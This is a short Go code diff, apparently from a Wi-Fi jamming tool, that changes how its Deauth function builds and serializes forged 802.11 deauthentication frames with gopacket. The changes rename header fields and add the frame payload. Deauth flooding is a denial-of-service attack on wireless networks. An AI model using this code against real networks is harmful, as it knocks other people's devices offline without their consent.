@@ -327,7 +327,7 @@ func (conn *JamConn) Deauth(client *Client, ap net.HardwareAddr) error {
 	var opts gopacket.SerializeOptions
 
 	opts.ComputeChecksums = true
-	dot11Cpy := client.dot11
+	dot11Cpy := client.dot11Hdr
 	dot11Cpy.SequenceNumber += 1
 	dot11Cpy.Type = layers.Dot11TypeMgmtDeauthentication
 	mgmt := layers.Dot11MgmtDeauthentication {
@@ -335,9 +335,10 @@ func (conn *JamConn) Deauth(client *Client, ap net.HardwareAddr) error {
 	}
 	buff = gopacket.NewSerializeBuffer()
 	err := gopacket.SerializeLayers(buff, opts,
-		&client.radioHdr,
+		&client.radioTapHdr,
 		&dot11Cpy,
 		&mgmt,
+		gopacket.Payload(mgmt.Payload),
 	)
 	if err != nil {
 		return errors.New("gopacket.SerializeLayers() " + err.Error())
